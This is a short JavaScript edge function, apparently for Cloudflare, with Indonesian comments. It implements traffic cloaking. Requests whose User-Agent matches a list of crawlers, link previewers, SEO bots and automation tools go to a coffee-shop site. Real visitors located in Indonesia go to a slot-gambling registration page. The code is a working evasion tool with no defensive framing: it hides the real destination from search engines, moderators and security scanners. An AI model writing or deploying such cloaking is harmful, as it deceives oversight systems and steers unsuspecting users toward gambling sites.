const PASS_URL = "https://myslot188bath.space/home/?register";
const BLOCK_URL = "https://lembayungcoffee.com/";

const BOT_SIGNATURES = [
  "googlebot",
  "adsbot-google",
  "mediapartners-google",
  "bingbot",
  "facebookexternalhit",
  "facebot",
  "meta-externalagent",
  "twitterbot",
  "linkedinbot",
  "pinterestbot",
  "ahrefsbot",
  "semrushbot",
  "mj12bot",
  "dotbot",
  "bytespider",
  "scrapy",
  "python-requests",
  "curl/",
  "wget/",
  "headlesschrome",
  "phantomjs",
  "selenium",
  "puppeteer",
  "playwright"
];

function isBot(userAgent) {
  const ua = userAgent.toLowerCase();

  return BOT_SIGNATURES.some(signature =>
    ua.includes(signature)
  );
}

export async function onRequest(context) {
  const request = context.request;

  const userAgent =
    request.headers.get("User-Agent") || "";

  /*
   * 1. BOT → URL TOLAK
   */
  if (isBot(userAgent)) {
    return Response.redirect(BLOCK_URL, 302);
  }

  /*
   * 2. BUKAN BOT → CEK NEGARA
   */
  const country = request.cf?.country;

  /*
   * 3. USER INDONESIA → URL LOLOS
   */
  if (country === "ID") {
    return Response.redirect(PASS_URL, 302);
  }

  /*
   * 4. USER LUAR INDONESIA → URL TOLAK
   */
  return Response.redirect(BLOCK_URL, 302);
}
